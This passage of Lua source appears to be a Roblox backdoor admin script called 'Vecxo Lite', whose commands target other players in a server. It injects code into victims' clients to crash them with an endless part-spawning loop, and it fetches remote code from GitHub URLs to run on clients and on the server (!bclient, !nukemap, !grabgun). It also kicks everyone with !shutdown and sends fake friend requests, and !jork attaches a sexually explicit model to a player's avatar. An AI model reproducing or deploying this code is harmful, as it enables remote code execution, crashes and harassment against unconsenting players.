			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				local sound = Instance.new("Sound", workspace)
				sound.SoundId = "rbxassetid://17659239587"
				sound.Volume = 10
				sound:Play()
				sound.Ended:Connect(function()
					sound:Destroy()
					script:Destroy()
				end)

			]]

			scr.Parent = plr.PlayerGui
			scr.Name = "JumpScareScript"
			scr.Enabled = true

			coroutine.wrap(function()
				task.wait(3.5)
				sgui:Destroy()
			end)()
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Flashbanged " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players sucessfully"))
	elseif cmd == "!crash" and args[2] then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if plr.Name ~= "Reloxz" then
				task.spawn(function()
					GraphicalEffects.CrystalRing(plr, "Really red", 2)
				end)
				if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
					local ticking = tick()
					require(gamegoog).load()
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

				if not goog then
					warn("goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr
				scr:WaitForChild("Exec").Value = [[
			task.spawn(function()
			while true do
					for i = 1, 1000000 do
						local a = Instance.new("Part", workspace)
						a.CFrame = CFrame.new(0, 5, 0)
						--a.Anchored = true
					end
					task.wait()
				end
			end)
			while true do end

			]]

				if plr.Character then
					scr.Parent = plr.Character
				else
					scr.Parent = plr:WaitForChild("PlayerGui")
				end

				scr.Enabled = true
			end 
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Crashed " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players sucessfully"))
	elseif cmd == "!bclient" and args[2] then
		handled = true
		local targets = GetPlayers(args[2], sender)
		local HttpService = game:GetService("HttpService")
		local code
		local success, err = pcall(function()
			code = HttpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/troll")
		end)

		if not success then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Failed to fetch code: " .. err)
			return
		end

		for _, plr in ipairs(targets) do
			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)
			if not goog then
				warn("goog failed to be added, command cannot continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = code -- inject downloaded code to client
			if plr.Character then
				scr.Parent = plr:WaitForChild("PlayerGui")
			end
			scr.Enabled = true
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Broke " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. "'s client successfully"))
	elseif cmd == "!mute" and args[2] then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if table.find(whitelisted, tostring(plr.UserId)) and sender.UserId ~= 36373784 then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You cannot mute the admins of this script!")
			else
				if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
					local ticking = tick()
					require(gamegoog).load()
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

				if not goog then
					warn("goog failed to be added, command can not continue")
					notifyv3(sender, "[Vecxo Lite]: ", "goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr
				scr:WaitForChild("Exec").Value = [[
				
					game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)

					task.wait(0.3)
					script:Destroy()
				
				]]

				if plr.Character then
					scr.Parent = plr.Character
				else
					scr.Parent = plr:WaitForChild("PlayerGui")
				end

				scr.Enabled = true
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Muted " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " successfully"))
	elseif cmd == "!unmute" and args[2] then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

			if not goog then
				warn("goog failed to be added, command can not continue")
				notifyv3(sender, "[Vecxo Lite]: ", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
				script:Destroy()
			
			]]

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Unmuted " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " successfully"))
	elseif cmd == "!sfakereq" and args[2] then
		handled = true
		local targets = GetPlayers(args[2], sender)
		local fakereqname = args[3]
		for i, plr in ipairs(targets) do
			_G.fakefriend(plr.Name, fakereqname)
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Sent a fake friend request to  " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players successfully with fake name as "..fakereqname))
	elseif cmd == "!grabgun" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do

			if plr.Character and plr.Character:FindFirstChild("Torso") and plr.Character:FindFirstChild("Humanoid") then

				_G.GunMan = plr.Name

				if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
					local ticking = tick()
					require(gamegoog).load() -- goog readder
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

				if not goog then
					warn("goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr
				scr:WaitForChild("Exec").Value = [[
				
				local Player = game:GetService("Players").LocalPlayer
				local Char = Player.Character
				local Event = Char:WaitForChild("UserInput_Event")
				local UIS = game:GetService("UserInputService")
				local input = function(io,a)
					if a then return end
					local io = {KeyCode=io.KeyCode,UserInputType=io.UserInputType,UserInputState=io.UserInputState}
					Event:FireServer(io)
				end
				UIS.InputBegan:Connect(input)
				UIS.InputEnded:Connect(input)
				local Changed = false
				local Mouse = Player:GetMouse()
				local h,t = Mouse.Hit,Mouse.Target
				while wait(1/30) do
					if h~=Mouse.Hit or t~=Mouse.Target then
						Event:FireServer({isMouse=true,Target=Mouse.Target,Hit=Mouse.Hit})
						h,t=Mouse.Hit,Mouse.Target
					end
				end

				]]

				if plr.Character then
					scr.Parent = plr.Character
				else
					scr.Parent = plr:WaitForChild("PlayerGui")
				end

				scr.Enabled = true

				if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
					local ticking = tick()
					require(gamegoog).load() -- goog readder
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

				if not goog then
					warn("goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Server:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr

				local success, content = pcall(function() -- grab gun script
					return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/grabgun")
				end)

				if success and typeof(content) == "string" then
					local loaded, fail = loadstring(content)
					if loaded then
						scr:WaitForChild("Exec").Value = content
						if plr.Character then
							scr.Parent = plr.Character
						else
							scr.Parent = plr:WaitForChild("PlayerGui")
						end
						scr.Name = "GrabGunMain"
						scr.Enabled = true
						notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfuly loaded the grab gun on "..plr.Name)
					else
						notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Failed to load the grab gun: " .. tostring(fail))
					end
				else
					notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Failed to load the grab gun")
				end
			end
		end
	elseif cmd == "!nukemap" then
		handled = true
		local InsertService = game:GetService("InsertService")
		local gearId = 88885539 -- Tactical Airstrike
		plr = sender
		local success, model = pcall(function()
			return InsertService:LoadAsset(gearId)
		end)

		if not success or not model then
			warn("Failed to load gear asset:", gearId)
			return
		end
		local baseTool = model:FindFirstChildOfClass("Tool")
		if not baseTool then
			warn("No Tool found in model")
			return
		end
		local backpack = sender:FindFirstChild("Backpack") or sender:WaitForChild("Backpack")
		notify(sender, "[Vecxo Lite]: ", "‚úÖ Getting gears...")
		for i = 1, 460 do
			local clonedTool = baseTool:Clone()
			clonedTool.Parent = backpack -- allow some breathing room
		end
		local amount = 0
		repeat
			amount = 0
			local clonedTool = baseTool:Clone()
			clonedTool.Parent = backpack
			for i, v in pairs(sender.Backpack:GetChildren()) do
				if v.Name == "Tactical Airstrike" then
					amount = amount +1
				end
			end
			game:GetService("RunService").Heartbeat:wait()
		until amount >= 460
		local HttpService = game:GetService("HttpService")
		local code
		local success, err = pcall(function()
			code = HttpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/nukez")
		end)

		if not success then
			return
		end

		if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
			local ticking = tick()
			require(gamegoog).load()
			repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
		end

		local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)
		if not goog then
			warn("goog failed to be added, command cannot continue")
			return
		end

		local scr = goog:FindFirstChild("Utilities").Client:Clone()
		local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

		loa.Parent = scr
		scr:WaitForChild("Exec").Value = code -- inject downloaded code to client
		if plr.Character then
			scr.Parent = plr:WaitForChild("PlayerGui")
		end
		scr.Enabled = true
	elseif cmd == "!to" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				sender.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -4.5)
			end
		end
	elseif cmd == "!bring" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				plr.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -4.5)
			end
		end
	elseif cmd == "!jork" then
		handled = true
		if not table.find(exclusivewl, sender.Name) then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
			return
		end

		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character:FindFirstChild("Torso") then
				-- Create parts
				local tip = Instance.new("Part", plr.Character)
				local peep = Instance.new("Part", plr.Character)
				local ball1 = Instance.new("Part", plr.Character)
				local ball2 = Instance.new("Part", plr.Character)

				local tipmesh = Instance.new("SpecialMesh", tip)
				local peepmesh = Instance.new("CylinderMesh", peep)
				local ball1mesh = Instance.new("SpecialMesh", ball1)
				local ball2mesh = Instance.new("SpecialMesh", ball2)

				-- Welds
				local tipweld = Instance.new("WeldConstraint", plr.Character)
				local peepweld = Instance.new("WeldConstraint", plr.Character)
				local peepweld2 = Instance.new("WeldConstraint", peep)
				local ball1weld = Instance.new("WeldConstraint", plr.Character)
				local ball2weld = Instance.new("WeldConstraint", plr.Character)

				-- Configure parts
				tip.BrickColor = BrickColor.new("Pink")
				tip.Size = Vector3.new(1, 1, 1)
				tip.BottomSurface = "Smooth"
				tip.TopSurface = "Smooth"
				tip.CanCollide = false
				tip.Locked = true

				peep.Color = plr.Character.Torso.Color
				peep.Size = Vector3.new(0.4, 1.3, 0.4)
				peep.BottomSurface = "Smooth"
				peep.TopSurface = "Smooth"
				peep.CanCollide = false
				peep.Locked = true

				ball1.Color = plr.Character.Torso.Color
				ball1.Size = Vector3.new(1, 1, 1)
				ball1.BottomSurface = "Smooth"
				ball1.TopSurface = "Smooth"
				ball1.CanCollide = false
				ball1.Locked = true

				ball2.Color = plr.Character.Torso.Color
				ball2.Size = Vector3.new(1, 1, 1)
				ball2.BottomSurface = "Smooth"
				ball2.TopSurface = "Smooth"
				ball2.CanCollide = false
				ball2.Locked = true

				tipmesh.MeshType = "Sphere"
				tipmesh.Scale = Vector3.new(0.4, 0.62, 0.4)

				ball1mesh.MeshType = "Sphere"
				ball1mesh.Scale = Vector3.new(0.4, 0.4, 0.4)

				ball2mesh.MeshType = "Sphere"
				ball2mesh.Scale = Vector3.new(0.4, 0.4, 0.4)

				peep.CFrame = plr.Character.Torso.CFrame * CFrame.new(0, -1, -1.15) * CFrame.Angles(math.rad(90), 0, 0)
				tip.CFrame = peep.CFrame * CFrame.new(0, -0.65, 0)
				ball1.CFrame = peep.CFrame * CFrame.new(0.25, 0.6, 0.25)
				ball2.CFrame = peep.CFrame * CFrame.new(-0.25, 0.6, 0.25)

				tipweld.Part0 = plr.Character.Torso
				tipweld.Part1 = tip

				peepweld.Part0 = plr.Character.Torso
				peepweld.Part1 = peep

				peepweld2.Part0 = peep
				peepweld2.Part1 = tip

				ball1weld.Part0 = plr.Character.Torso
				ball1weld.Part1 = ball1

				ball2weld.Part0 = plr.Character.Torso
				ball2weld.Part1 = ball2

				-- Animations
				local h = plr.Character:FindFirstChild("Humanoid")
				local anim1 = Instance.new("Animation")
				anim1.AnimationId = "rbxassetid://72042024"
				local anim2 = Instance.new("Animation")
				anim2.AnimationId = "rbxassetid://168268306"

				local track1 = h:LoadAnimation(anim1)
				local track2 = h:LoadAnimation(anim2)

				local length1 = track1.Length
				local length2 = track2.Length
				local restartPoint1 = length1 - 0.2
				local restartPoint2 = length2 - 0.2
				local puddles = {}

				local function spawnWhitePart2()
					local tiny = Instance.new("Part")
					tiny.Size = Vector3.new(0.08, 0.08, 0.08)
					tiny.Shape = Enum.PartType.Ball
					tiny.BrickColor = BrickColor.new("White")
					tiny.Material = Enum.Material.SmoothPlastic
					tiny.CFrame = tip.CFrame
					tiny.CanCollide = false
					tiny.Anchored = false
					tiny.Parent = workspace

					local bv = Instance.new("BodyVelocity")
					bv.Velocity = Vector3.new(
						(math.random()-0.5)*0.5,
						-5,
						(math.random()-0.5)*0.5
					)
					bv.MaxForce = Vector3.new(4000, 4000, 4000)
					bv.P = 1000
					bv.Parent = tiny

					game:GetService("Debris"):AddItem(tiny, 3)
				end


				local function spawnWhitePart(player)
					local stopped = false
					if stopped == false then
						local tiny = Instance.new("Part")
						tiny.Size = Vector3.new(0.08, 0.08, 0.08)
						tiny.Shape = Enum.PartType.Ball
						tiny.BrickColor = BrickColor.new("White")
						tiny.Material = Enum.Material.SmoothPlastic
						tiny.CFrame = tip.CFrame
						tiny.CanCollide = false
						tiny.Anchored = false
						tiny.Parent = workspace

						local bv = Instance.new("BodyVelocity")
						bv.Velocity = Vector3.new(
							(math.random()-0.5)*0.5,
							-5,
							(math.random()-0.5)*0.5
						)
						bv.MaxForce = Vector3.new(4000, 4000, 4000)
						bv.P = 1000
						bv.Parent = tiny
						local respawnConnection
						if player then
							respawnConnection = player.CharacterAdded:Connect(function()
								stopped = true
							end)
						end
						spawn(function()
							local rayParams = RaycastParams.new()
							rayParams.FilterDescendantsInstances = {tiny}
							rayParams.FilterType = Enum.RaycastFilterType.Blacklist
							while tiny and tiny.Parent and stopped == false do
								local ray = workspace:Raycast(tiny.Position, Vector3.new(0, -0.5, 0), rayParams)
								if ray and ray.Instance and ray.Instance.Anchored then
									tiny:Destroy()
									local puddlePos = ray.Position + Vector3.new(0, 0.01, 0)
									local merged = false
									for _, p in pairs(puddles) do
										if (p.Position - puddlePos).Magnitude < 1 then
											merged = true
											spawn(function()
												for i = 1, 60 do
													if stopped then break end
													local mesh = p:FindFirstChild("Mesh")
													if mesh then
														mesh.Scale = mesh.Scale + Vector3.new(0.05, 0, 0.05)
													end
													wait(0.1)
												end
												for t = 0, 1, 0.02 do
													p.Transparency = t
													wait(0.4)
												end
												p:Destroy()
											end)
											break
										end
										if stopped == true then
											p:Destroy()
										end
									end
									if not merged then
										local puddle = Instance.new("Part")
										puddle.Size = Vector3.new(1, 1, 1)
										puddle.Anchored = true
										puddle.CanCollide = false
										puddle.Material = Enum.Material.SmoothPlastic
										puddle.BrickColor = BrickColor.new("White")
										puddle.CFrame = CFrame.new(puddlePos)
										puddle.Parent = workspace
										local mesh = Instance.new("SpecialMesh")
										mesh.MeshType = Enum.MeshType.Sphere
										mesh.Scale = Vector3.new(0.2, 0.05, 0.2)
										mesh.Parent = puddle
										mesh.Name = "Mesh"
										table.insert(puddles, puddle)
										spawn(function()
											if stopped == true then
												puddle:Destroy()
											end
											for i = 1, 60 do
												if stopped then break end
												mesh.Scale = mesh.Scale + Vector3.new(0.02, 0, 0.02)
												puddle.CFrame = CFrame.new(puddle.Position.X, puddlePos.Y, puddle.Position.Z)
												wait(0.1)
											end
											for t = 0, 1, 0.02 do
												puddle.Transparency = t
												wait(0.6)
											end
											puddle:Destroy()
										end)
									end
									break
								end
								wait(0.03)
							end
						end)
					end
				end
				spawn(function()
					while plr and plr.Parent do
						track1:Play()
						track1.TimePosition = 0.4
						if track1.TimePosition >= restartPoint1 then
							track1.TimePosition = 0.4
						end
						track2:Play()
						track2.TimePosition = 0.5
						if track2.TimePosition >= restartPoint2 then
							track2.TimePosition = 0.5
						end
						spawnWhitePart()
						spawnWhitePart2()
						wait(0.2)
					end
				end)
			end
		end

	elseif cmd == "!jumpscare" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			local sgui = Instance.new("ScreenGui", plr.PlayerGui)
			local scary = Instance.new("ImageLabel", sgui)

			scary.Size = UDim2.new(1,0,1.1,0)
			scary.BackgroundTransparency = 1
			scary.Image = "rbxassetid://13825687318"
			scary.ZIndex = 10
			scary.Visible = true

			sgui.IgnoreGuiInset = true

			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				local sound = Instance.new("Sound", workspace)
				sound.SoundId = "rbxassetid://270145703"
				sound.Volume = 10
				sound:Play()
				sound.Ended:Connect(function()
					sound:Destroy()
					script:Destroy()
				end)

			]]

			scr.Parent = plr.PlayerGui
			scr.Name = "JumpScareScript"
			scr.Enabled = true

			coroutine.wrap(function()
				task.wait(3.5)
				sgui:Destroy()
			end)()
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Jumpscared  " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players successfully"))
	elseif cmd == "!findgear" then
		handled = true
		local targetKeyword = args[2]
		if not targetKeyword then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Please specify a target (e.g. me) and gear name.")
			return
		end
		local targets = GetPlayers(targetKeyword, sender)
		if #targets == 0 then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå No valid target players found.")
			return
		end
		local gearName = table.concat(args, " ", 3)
		if gearName == "" then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Please specify the gear name.")
			return
		end
		local encodedGearName = game:GetService("HttpService"):UrlEncode(gearName)
		local url = "https://catalog.roproxy.com/v1/search/items?category=Accessories&includeNotForSale=true&limit=10&salesTypeFilter=1&subcategory=Gear&Keyword=" .. encodedGearName

		local response = game:GetService("HttpService"):GetAsync(url)
		local data = game:GetService("HttpService"):JSONDecode(response)

		if data and data.data and #data.data > 0 then
			local success, gear = pcall(function()
				return game:GetService("InsertService"):LoadAsset(data.data[1].id)
			end)

			if success and gear then
				for _, plr in ipairs(targets) do
					local item = gear:FindFirstChildOfClass("Tool")
					if item then
						item.Parent = plr.Backpack
					else
						notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Gear asset does not contain a Tool.")
					end
				end
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Failed to insert the gear.")
			end
		else
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå No gear found matching that name.")
		end
	elseif cmd == "!findsong" then
		handled = true
		local songName = table.concat(args, " ", 2)
		if songName == "" then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Please specify a song name.")
			return
		end

		local encodedSongName = game:GetService("HttpService"):UrlEncode(songName)
		local url = "https://catalog.roproxy.com/v1/search/items?category=Audio&limit=10&Keyword=" .. encodedSongName

		local success, response = pcall(function()
			return game:GetService("HttpService"):GetAsync(url)
		end)

		if not success then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Failed to fetch data from catalog.")
			return
		end
		local data = game:GetService("HttpService"):JSONDecode(response)
		if data and data.data and #data.data > 0 then
			local songId = data.data[1].id
			if workspace:FindFirstChild("Sound") then
				workspace.Sound:Stop()
				workspace.Sound:Destroy()
			end

			local sound = Instance.new("Sound")
			sound.SoundId = "rbxassetid://" .. songId
			sound.Looped = true
			sound.Volume = 1
			sound.Parent = workspace
			sound:Play()
			notifyv3(sender, "[Vecxo Lite]: ", "üéµ Now playing: " .. data.data[1].name)
		else
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå No song found matching that name.")
		end
	elseif cmd == "!tools" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(16052382566).PoopToolsV2(plr.Name)
			end)
			if fail then
				notifyv3(sender, "[Vecxo Lite]: ", "Tools failed to load: ".. fail)
			end
		end
	elseif cmd == "!maxwell" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			local sus
			if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Talking Maxwell") then
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Talking Maxwell").Parent = plr.Backpack
			end
			local success, fail = pcall(function()
				require(87631077502363).load("Talking Maxwell")
			end)
			if fail then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Maxwell failed to load: ".. fail)
			end
			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Talking Maxwell")
			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Talking Maxwell").Parent = plr.Backpack
		end
	elseif cmd == "!perm" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			if table.find(_G.tempadmins, plr.Name) and not table.find(_G.permadmins, plr.Name) then
				table.insert(_G.permadmins, plr.Name)
			elseif not table.find(_G.permadmins, plr.Name) and not table.find(_G.tempadmins, plr.Name) then
				table.insert(_G.permadmins, plr.Name)
				table.insert(_G.tempadmins, plr.Name)
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ "..plr.Name .." already has perm admin!")
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Gave perm to  " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players successfully"))
	elseif cmd == "!unperm" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Really red", 2)
			end)
			if table.find(_G.permadmins, plr.Name) then
				table.remove(_G.permadmins, table.find(_G.permadmins, plr.Name))
			end
			if table.find(_G.tempadmins, plr.Name) then
				table.remove(_G.tempadmins, table.find(_G.tempadmins, plr.Name))
			end
		end
	elseif cmd == "!p299" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			if not table.find(_G.p299, plr.Name) then
				table.insert(_G.p299, plr.Name)
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ "..plr.Name .." already has person299 admin!")
			end
		end
	elseif cmd == "!unp299" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Really red", 2)
			end)
			if table.find(_G.p299, plr.Name) then
				table.remove(_G.p299, table.find(_G.p299, plr.Name))
			else
				notifyv3(sender, "[Vecxo Lite]: ", plr.Name .. " Doesn't have person299!")
			end
		end
	elseif cmd == "!f3x" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			local success, err = pcall(function()
				require(2571067295).load(plr.Name)
			end)
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Gave F3X Tool too " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!clyde" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			local sgui = Instance.new("ScreenGui", plr.PlayerGui)
			local scary = Instance.new("ImageLabel", sgui)

			scary.Size = UDim2.new(1,0,1.1,0)
			scary.BackgroundTransparency = 1
			scary.Image = "rbxassetid://15637324487"
			scary.ZIndex = 10
			scary.Visible = true

			sgui.IgnoreGuiInset = true

			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				local sound = Instance.new("Sound", workspace)
				sound.SoundId = "rbxassetid://270145703"
				sound.Volume = 10
				sound:Play()
				sound.Ended:Connect(function()
					sound:Destroy()
					script:Destroy()
				end)

			]]

			scr.Parent = plr.PlayerGui
			scr.Name = "JumpScareScript"
			scr.Enabled = true

			coroutine.wrap(function()
				task.wait(3.5)
				sgui:Destroy()
			end)()
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Put clyde on  " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players successfully"))
	elseif cmd == "!slenderman" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			local sgui = Instance.new("ScreenGui", plr.PlayerGui)
			local scary = Instance.new("ImageLabel", sgui)

			scary.Size = UDim2.new(1,0,1.1,0)
			scary.Position = UDim2.new(0, 0, 0, 0)
			scary.Image = "rbxassetid://16999373390"
			scary.Visible = true

			sgui.IgnoreGuiInset = true

			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				local sound = Instance.new("Sound", workspace)
				sound.SoundId = "rbxassetid://270145703"
				sound.Volume = 10
				sound:Play()
				sound.Ended:Connect(function()
					sound:Destroy()
					script:Destroy()
				end)

			]]

			scr.Parent = plr.PlayerGui
			scr.Name = "JumpScareScript"
			scr.Enabled = true
			coroutine.wrap(function()
				task.wait(3.5)
				sgui:Destroy()
			end)()
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Put slenderman on  " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players successfully"))
	elseif cmd == "!shutdown" then
		handled = true
		local reason = table.concat(args, " ", 2)
		local message = "[Vecxo Lite]: This server has been shutdown."
		if reason ~= "" then
			message = message .. "\n Reason: " .. reason
		end
		for _, plr in pairs(game.Players:GetPlayers()) do
			plr:Kick(message)
		end
		game.Players.ChildAdded:Connect(function(plrv2)
			plrv2:Kick(message)
		end)
	elseif cmd == "!wls" then
		handled = true
